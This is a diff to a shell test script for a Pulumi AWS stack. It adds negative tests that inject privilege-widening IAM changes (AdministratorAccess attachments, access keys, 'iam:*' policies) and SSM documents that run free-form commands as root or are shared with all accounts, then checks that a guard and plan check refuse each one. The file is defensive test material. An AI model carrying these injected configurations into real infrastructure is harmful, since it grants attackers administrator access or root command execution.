-        diag=$(first_line "$t" "$out")
-        test -n "$diag" || { echo "$out"; fail "existing stack, $v: the plan check refused, but not with \"$t\""; }
-        echo "existing stack, $v: $diag"
+        for want in "$t" ${t2:+"$t2"}; do
+            diag=$(first_line "$want" "$out")
+            test -n "$diag" || { echo "$out"; fail "existing stack, $v: the plan check refused, but not with \"$want\""; }
+            echo "existing stack, $v: $diag"
+        done
     done
-    echo "$label: ok (dnsMode $(dns_mode): the preview, the plan check and the 14 egress outputs passed; the existing-stack plans (same, update, the Deny created) passed, their seven tampered copies were refused)"
+    echo "$label: ok (dnsMode $(dns_mode): the preview, the plan check and the 25 egress and operator outputs passed; the existing-stack plans (same, update, the Deny created, the bootstrap) passed, their twenty-one tampered copies were refused)"
     ;;
 no-logging)
     edit '/scratch:logging/d'
@@ -544,7 +714,13 @@ miswired)
     grep -qF 'pulumi.all([names, proxySubnet.id, sgs.vm.id])' egress.ts || fail "the scratch:operator-deny marker no longer builds the operator role's Deny from the proxy subnet"
     expect_plan_refusal "aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy does not depend on aws:ec2/subnet:Subnet::ai-env-egress-vms" \
         "aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy depends on aws:ec2/subnet:Subnet::ai-env-egress-proxy"
-    echo "$label: ok (the plan check refused swapped route table associations, rules on the wrong group, a self-referencing rule and an operator role Deny built from the proxy subnet)"
+    # S8 operators: ai-env-ops' document is unknown in this preview as well (accepted while what it depends on is
+    # created), so only its URNs tell that it names something other than the proxy instance (any instance, say).
+    restore egress.ts
+    edit_file index.ts '/scratch:ops-names/s|pulumi.all(\[names, net.instance.id\])|pulumi.all([names, net.vmSubnet.id])|'
+    grep -qF 'pulumi.all([names, net.vmSubnet.id]).apply(([n, proxyInstanceId]) => ({ // scratch:ops-names' index.ts || fail "the scratch:ops-names marker no longer builds the ops policy from the VM subnet's id"
+    expect_plan_refusal "aws:iam/policy:Policy ai-env-ops: policy does not depend on aws:ec2/instance:Instance::ai-env-egress-proxy"
+    echo "$label: ok (the plan check refused swapped route table associations, rules on the wrong group, a self-referencing rule, an operator role Deny built from the proxy subnet and an ops policy built from the VM subnet)"
     ;;
 iam-widen)
     edit_file iam.ts '/scratch:exec-role/s|assumeRolePolicy: trust, tags,|assumeRolePolicy: trust, tags, managedPolicyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"],|'
@@ -552,16 +728,15 @@ iam-widen)
     expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/role:Role ai-env-vm-exec: input managedPolicyArns is outside the stack spec"
     edit_file egress.ts '/scratch:operator-role/s|assumeRolePolicy: JSON.stringify(operatorTrustPolicy()), tags,|assumeRolePolicy: JSON.stringify(operatorTrustPolicy()), tags, inlinePolicies: [{ name: "widen", policy: JSON.stringify({ Version: "2012-10-17", Statement: [{ Effect: "Allow", Action: "iam:*", Resource: "*" }] }) }],|'
     grep -qF 'inlinePolicies: [{ name: "widen"' egress.ts || fail "the scratch:operator-role marker no longer adds an inline policy"
-    edit_file policies.ts '/scratch:runtime/s|^\(.*\)}, // scratch:runtime$|\1}, { Sid: "Widen", Effect: "Allow", Action: ["*"], Resource: ["*"] }, // scratch:runtime|'
-    grep -qF '{ Sid: "Widen", Effect: "Allow", Action: ["*"], Resource: ["*"] }, // scratch:runtime' policies.ts || fail "the scratch:runtime marker no longer widens MacRuntimePolicy"
+    # MacRuntimePolicy widened is the positive run's existing-stack copy runtime-widen: its document names the
+    # connector's ARN (S7 D5), unknown in this fresh preview, which the plan check accepts while the connector is created.
     edit_file policies.ts '/scratch:proxy-policy/s|Action: \["ssm:GetParameter", "ssm:GetParameters"\]|Action: ["ssm:*"]|'
     grep -qF 'Action: ["ssm:*"], Resource: [proxyParameterArn(n)] }, // scratch:proxy-policy' policies.ts || fail "the scratch:proxy-policy marker no longer widens the proxy's policy"
     no_guard
     expect_plan_refusal "aws:iam/role:Role ai-env-vm-exec: managedPolicyArns must be unset" \
         "aws:iam/role:Role ai-env-egress-operator: inlinePolicies must be unset" \
-        "aws:iam/userPolicy:UserPolicy MacRuntimePolicy: policy is not policies.ts runtimePolicy(); extra statements Widen" \
         "aws:iam/rolePolicy:RolePolicy ai-env-egress-proxy: policy is not policies.ts proxyRolePolicy(); a statement differs"
-    echo "$label: ok (the guard refused a managed policy on a role; the plan check refused it, an operator inline policy and two widened documents)"
+    echo "$label: ok (the guard refused a managed policy on a role; the plan check refused it, an operator inline policy and a widened proxy document)"
     ;;
 owned-param-reset)
     plan=$(json_plan) || fail "the preview failed, so the plan check was not reached"
@@ -580,5 +755,144 @@ process.stdout.write(JSON.stringify(plan));
         echo "plan: $diag"
     done
     echo "$label: ok (the plan check refused an update and a replace of the parameters ai-env egress owns)"
+    ;;
+identity-widen)
+    # S8 operators: what the operator identities must never get. 1. AdministratorAccess attached to ai-env-ops instead
+    # of its policy (iam.ts's scratch:attach): the guard.
+    attach_admin='/scratch:attach/s|policyArn: held.arn,|policyArn: u === OPS_USER_NAME ? "arn:aws:iam::aws:policy/AdministratorAccess" : held.arn,|'
+    edit_file iam.ts "$attach_admin"
+    grep -qF 'policyArn: u === OPS_USER_NAME ? "arn:aws:iam::aws:policy/AdministratorAccess" : held.arn, // scratch:attach' iam.ts || fail "the scratch:attach marker no longer attaches AdministratorAccess to ai-env-ops"
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--ai-env-ops: policyArn must be the stack's policy ai-env-ops"
+    restore iam.ts
+    # 1b. ai-env-deployer retained on delete, protected, or deleted with another resource (iam.ts's scratch:deployer-user;
+    # buildRole is in scope there): nothing outlives make destroy, the account root's, and nothing makes it refuse: the
+    # guard, each option alone.
+    for opt in "retainOnDelete: true" "protect: true" "deletedWith: buildRole"; do
+        edit_file iam.ts "/scratch:deployer-user/s|{ dependsOn: \\[|{ $opt, dependsOn: [|"
+        grep -qF "{ $opt, dependsOn: [" iam.ts || fail "the scratch:deployer-user marker no longer gives ai-env-deployer $opt"
+        expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/user:User ai-env-deployer: ${opt%%:*} is refused"
+        restore iam.ts
+    done
+    # 1c. ai-env-deploy's attachment binding ai-env-ops instead of the deployer (iam.ts's scratch:attach-user): the daily
+    # key would deploy: the guard.
+    attach_user='/scratch:attach-user/s|user: holder.name,|user: p === DEPLOY_POLICY_NAME ? OPS_USER_NAME : holder.name,|'
+    edit_file iam.ts "$attach_user"
+    grep -qF 'user: p === DEPLOY_POLICY_NAME ? OPS_USER_NAME : holder.name, // scratch:attach-user' iam.ts || fail "the scratch:attach-user marker no longer binds ai-env-deploy's attachment to ai-env-ops"
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user must be"
+    restore iam.ts
+    # 1d. MacRuntimePolicy on ai-env-ops instead of ai-env-runtime (iam.ts's scratch:runtime-user; a literal user, since the
+    # runtime user's name is another resource's output, unknown to the guard in a fresh preview): the daily key would
+    # hold the runtime grants (RunMicrovm, the shell token, PassRole on the execution role): the guard.
+    runtime_user='/scratch:runtime-user/s|user: runtimeUser.name,|user: OPS_USER_NAME,|'
+    edit_file iam.ts "$runtime_user"
+    grep -qF 'user: OPS_USER_NAME, policy: render(runtimeNames, runtimePolicy) }, opts); // scratch:runtime-user' iam.ts || fail "the scratch:runtime-user marker no longer binds MacRuntimePolicy to ai-env-ops"
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user must be"
+    restore iam.ts
+    # 2. An access key, a login profile, an attachment of AdministratorAccess, a group membership, a PolicyAttachment and
+    # a UserPolicyAttachmentsExclusive of ai-env-ops, each appended to index.ts alone: the guard.
+    key='new aws.iam.AccessKey("ai-env-ops-key", { user: "ai-env-ops" }, { provider: awsProvider });'
+    login='new aws.iam.UserLoginProfile("ai-env-ops-console", { user: "ai-env-ops" }, { provider: awsProvider });'
+    admin='new aws.iam.UserPolicyAttachment("ai-env-ops--AdministratorAccess", { user: "ai-env-ops", policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" }, { provider: awsProvider });'
+    group='new aws.iam.UserGroupMembership("ai-env-ops-groups", { user: "ai-env-ops", groups: ["ai-env-admins"] }, { provider: awsProvider });'
+    everyone='new aws.iam.PolicyAttachment("ai-env-ops-everyone", { policyArn: "arn:aws:iam::aws:policy/AdministratorAccess", users: ["ai-env-ops"] }, { provider: awsProvider });'
+    exclusive='new aws.iam.UserPolicyAttachmentsExclusive("ai-env-ops-exclusive", { userName: "ai-env-ops", policyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"] }, { provider: awsProvider });'
+    for pair in "aws:iam/accessKey:AccessKey ai-env-ops-key|$key" "aws:iam/userLoginProfile:UserLoginProfile ai-env-ops-console|$login" \
+        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--AdministratorAccess|$admin" "aws:iam/userGroupMembership:UserGroupMembership ai-env-ops-groups|$group" \
+        "aws:iam/policyAttachment:PolicyAttachment ai-env-ops-everyone|$everyone" \
+        "aws:iam/userPolicyAttachmentsExclusive:UserPolicyAttachmentsExclusive ai-env-ops-exclusive|$exclusive"; do
+        restore index.ts
+        append "${pair#*|}"
+        expect_refusal guard "egress guard (infra/egress.ts) refused ${pair%%|*}: not in the stack inventory"
+    done
+    # 3. All of them, and the deployer's attach condition widened to AdministratorAccess (policies.ts's
+    # scratch:deployer-attach: a document, which only the plan check compares), the guard off: the plan.
+    restore index.ts
+    edit_file iam.ts "$attach_admin" "$attach_user" "$runtime_user" '/scratch:deployer-user/s|{ dependsOn: \[|{ retainOnDelete: true, protect: true, deletedWith: buildRole, dependsOn: [|'
+    grep -qF '{ retainOnDelete: true, protect: true, deletedWith: buildRole, dependsOn: [' iam.ts || fail "the scratch:deployer-user marker no longer gives ai-env-deployer all three options"
+    grep -qF 'user: OPS_USER_NAME, policy: render(runtimeNames, runtimePolicy) }, opts); // scratch:runtime-user' iam.ts || fail "the scratch:runtime-user marker no longer binds MacRuntimePolicy to ai-env-ops"
+    for code in "$key" "$login" "$admin" "$group" "$everyone" "$exclusive"; do append "$code"; done
+    edit_file policies.ts '/scratch:deployer-attach/s|DEPLOYER_POLICIES.map((p) => policyArn(n, p))|[...DEPLOYER_POLICIES.map((p) => policyArn(n, p)), "arn:aws:iam::aws:policy/AdministratorAccess"]|'
+    grep -qF '"arn:aws:iam::aws:policy/AdministratorAccess"] } }, // scratch:deployer-attach' policies.ts || fail "the scratch:deployer-attach marker no longer widens the deployer's attach condition"
+    no_guard
+    expect_plan_refusal "aws:iam/accessKey:AccessKey: not in the stack inventory: ai-env-ops-key" \
+        "aws:iam/userLoginProfile:UserLoginProfile: not in the stack inventory: ai-env-ops-console" \
+        "aws:iam/userPolicyAttachment:UserPolicyAttachment: not in the stack inventory: ai-env-ops--AdministratorAccess" \
+        "aws:iam/userGroupMembership:UserGroupMembership: not in the stack inventory: ai-env-ops-groups" \
+        "aws:iam/policyAttachment:PolicyAttachment: not in the stack inventory: ai-env-ops-everyone" \
+        "aws:iam/userPolicyAttachmentsExclusive:UserPolicyAttachmentsExclusive: not in the stack inventory: ai-env-ops-exclusive" \
+        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--ai-env-ops: policyArn depends on nothing, expected aws:iam/policy:Policy::ai-env-ops" \
+        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user depends on nothing, expected aws:iam/user:User::ai-env-deployer" \
+        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user ai-env-ops is not ai-env-deployer" \
+        "aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user depends on nothing, expected aws:iam/user:User::ai-env-runtime" \
+        "aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user ai-env-ops is not ai-env-runtime" \
+        "aws:iam/user:User ai-env-deployer: protected" \
+        "aws:iam/user:User ai-env-deployer: retainOnDelete" \
+        "aws:iam/user:User ai-env-deployer: deletedWith aws:iam/role:Role::ai-env-image-build" \
+        "aws:iam/policy:Policy ai-env-deployer: policy is not policies.ts deployerPolicy(); a statement differs"
+    echo "$label: ok (the guard refused AdministratorAccess on ai-env-ops, ai-env-deployer retained on delete, protected or deleted with another resource, ai-env-deploy's attachment bound to ai-env-ops, MacRuntimePolicy bound to ai-env-ops, and each key, login profile, group membership and other attachment of ai-env-ops; the plan check refused all of them and the widened deployer attach condition)"
+    ;;
+document-widen)
+    # S8 operators: the proxy's documents run as root on the proxy. 1. A free-form parameter the reload document's
+    # script runs: the spec (assertProxyDocuments), the guard, the plan.
+    node -e '
+const fs = require("fs");
+const f = "proxy/documents/reload.json";
+const d = JSON.parse(fs.readFileSync(f, "utf-8"));
+d.parameters.commands = { type: "String", default: "true" };
+d.mainSteps[0].inputs.runCommand.push("{{ commands }}");
+fs.writeFileSync(f, JSON.stringify(d, null, 2) + "\n");
+' || fail "the scratch proxy/documents/reload.json could not be edited"
+    grep -qF '"{{ commands }}"' proxy/documents/reload.json || fail "the scratch proxy/documents/reload.json does not run {{ commands }}"
+    expect_refusal spec "infra/proxy/documents/reload.json: parameter commands has no allowedValues"
+    no_spec
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-reload: parameter commands has no allowedValues"
+    no_guard
+    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-reload: parameter commands has no allowedValues"
+    # 1b. An {{ssm:…}} reference in the status document's script (SSM would put a parameter's value into the script, run
+    # as root on the proxy): the spec, the guard, the plan.
+    restore proxy/documents/reload.json index.ts egress.ts
+    node -e '
+const fs = require("fs");
+const f = "proxy/documents/status.json";
+const d = JSON.parse(fs.readFileSync(f, "utf-8"));
+d.mainSteps[0].inputs.runCommand.push("{{ssm:/ai-env/proxy/extras}}");
+fs.writeFileSync(f, JSON.stringify(d, null, 2) + "\n");
+' || fail "the scratch proxy/documents/status.json could not be edited"
+    grep -qF '"{{ssm:/ai-env/proxy/extras}}"' proxy/documents/status.json || fail "the scratch proxy/documents/status.json does not run {{ssm:/ai-env/proxy/extras}}"
+    expect_refusal spec "infra/proxy/documents/status.json: {{ssm:/ai-env/proxy/extras}} is a reference SSM resolves on the instance"
+    no_spec
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-status: {{ssm:/ai-env/proxy/extras}} is a reference SSM resolves on the instance"
+    no_guard
+    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-status: {{ssm:/ai-env/proxy/extras}} is a reference SSM resolves on the instance"
+    # 1c. A second step in the patch document (another script, run as root after the first): the spec, the guard, the plan.
+    restore proxy/documents/status.json index.ts egress.ts
+    node -e '
+const fs = require("fs");
+const f = "proxy/documents/patch.json";
+const d = JSON.parse(fs.readFileSync(f, "utf-8"));
+d.mainSteps.push({ action: "aws:runShellScript", name: "more", inputs: { timeoutSeconds: "1800", runCommand: ["true"] } });
+fs.writeFileSync(f, JSON.stringify(d, null, 2) + "\n");
+' || fail "the scratch proxy/documents/patch.json could not be edited"
+    test "$(grep -c '"aws:runShellScript"' proxy/documents/patch.json)" = 2 || fail "the scratch proxy/documents/patch.json does not have a second step"
+    expect_refusal spec "infra/proxy/documents/patch.json: mainSteps must be exactly one step, got 2"
+    no_spec
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-patch: mainSteps must be exactly one step, got 2"
+    no_guard
+    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-patch: mainSteps must be exactly one step, got 2"
+    # 2. The documents shared with every account (egress.ts's scratch:document): the guard, the plan.
+    restore proxy/documents/patch.json index.ts egress.ts
+    edit_file egress.ts '/scratch:document/s|content: docs\[role\], tags|content: docs[role], permissions: { type: "Share", account_ids: "All" }, tags|'
+    grep -qF 'permissions: { type: "Share", account_ids: "All" }, tags, // scratch:document' egress.ts || fail "the scratch:document marker no longer shares the documents"
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-reload: input permissions is outside the stack spec"
+    no_guard
+    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-reload: input permissions must be unset"
+    # 3. The status document's script edited (it reloads instead): the guard, the plan.
+    restore egress.ts
+    edit_file egress.ts '/scratch:document/s|content: docs\[role\],|content: docs[role].replace("--status", "--if-changed"),|'
+    grep -qF 'content: docs[role].replace("--status", "--if-changed"), tags, // scratch:document' egress.ts || fail "the scratch:document marker no longer edits the documents"
+    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-status: content is not infra/proxy/documents/status.json"
+    no_guard
+    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-status: content is not infra/proxy/documents/status.json"
+    echo "$label: ok (spec, guard and plan each refused a free-form document parameter, an {{ssm:…}} reference and a second step; guard and plan each refused a shared document and an edited script)"
     ;;
 esac
